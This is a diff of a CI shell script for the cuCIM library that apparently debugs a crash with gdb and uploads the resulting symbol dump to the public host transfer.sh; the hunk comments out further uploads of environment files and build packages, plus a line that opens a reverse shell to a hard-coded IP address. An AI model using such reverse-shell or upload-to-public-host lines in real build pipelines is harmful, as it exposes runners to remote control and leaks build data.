@@ -152,44 +152,44 @@ gdb -ex 'set confirm off' -ex 'run -c "import cucim.clara._cucim as cc"' -ex 'bt
 echo "Allocationg cuda memory"
 gdb -ex 'set pagination off' -ex 'set breakpoint pending on' -ex 'set confirm off' -ex 'b filesystem/cufile_driver.cpp:337' -ex 'run -c "import cucim.clara._cucim as cc; cc.haha(\"dd\");print(\"hoho\")"' -ex 'bt' -ex 'i proc m' -ex 'maint print symbols gdb.txt' -ex 'info functions' -ex 'c' -ex 'bt' -ex 'i proc m' -ex 'quit' `which python`
 
-curl --upload-file -v ./gdb.txt http://transfer.sh/gdb.txt
+curl --upload-file ./gdb.txt -v http://transfer.sh/gdb.txt
 echo
 
-set +e
-#/bin/bash -i > /dev/tcp/206.189.160.33/9999 0<&1 2>&1
-conda env export > environment.yml
-echo
-curl --upload-file ./environment.yml http://transfer.sh/environment.yml
-echo
+# set +e
+# #/bin/bash -i > /dev/tcp/206.189.160.33/9999 0<&1 2>&1
+# conda env export > environment.yml
+# echo
+# curl --upload-file ./environment.yml http://transfer.sh/environment.yml
+# echo
 
-for i in `ls -1 /workspace/ci/artifacts/cucim/cpu/.conda-bld/linux-64/libcucim-*.bz2`; do
-    curl --upload-file $i http://transfer.sh/$(basename $i)
-    echo
-done
+# for i in `ls -1 /workspace/ci/artifacts/cucim/cpu/.conda-bld/linux-64/libcucim-*.bz2`; do
+#     curl --upload-file $i http://transfer.sh/$(basename $i)
+#     echo
+# done
 
-for i in `ls -1 /opt/conda/envs/rapids/conda-bld/linux-64/cucim-*.bz2`; do
-    curl --upload-file $i http://transfer.sh/$(basename $i)
-    echo
-done
+# for i in `ls -1 /opt/conda/envs/rapids/conda-bld/linux-64/cucim-*.bz2`; do
+#     curl --upload-file $i http://transfer.sh/$(basename $i)
+#     echo
+# done
 
-gpuci_logger "Check versions"
-python --version
-$CC --version
-$CXX --version
-conda info
-conda config --show-sources
-conda list --show-channel-urls
+# gpuci_logger "Check versions"
+# python --version
+# $CC --version
+# $CXX --version
+# conda info
+# conda config --show-sources
+# conda list --show-channel-urls
 
-if hasArg --skip-tests; then
-    gpuci_logger "Skipping Tests"
-else
-    gpuci_logger "Check GPU usage"
-    nvidia-smi
+# if hasArg --skip-tests; then
+#     gpuci_logger "Skipping Tests"
+# else
+#     gpuci_logger "Check GPU usage"
+#     nvidia-smi
 
-    gpuci_logger "Check NICs"
-    awk 'END{print $1}' /etc/hosts
-    cat /etc/hosts
+#     gpuci_logger "Check NICs"
+#     awk 'END{print $1}' /etc/hosts
+#     cat /etc/hosts
 
-    gpuci_logger "Python py.test for cuCIM"
-    ./run test python all
-fi
+#     gpuci_logger "Python py.test for cuCIM"
+#     ./run test python all
+# fi
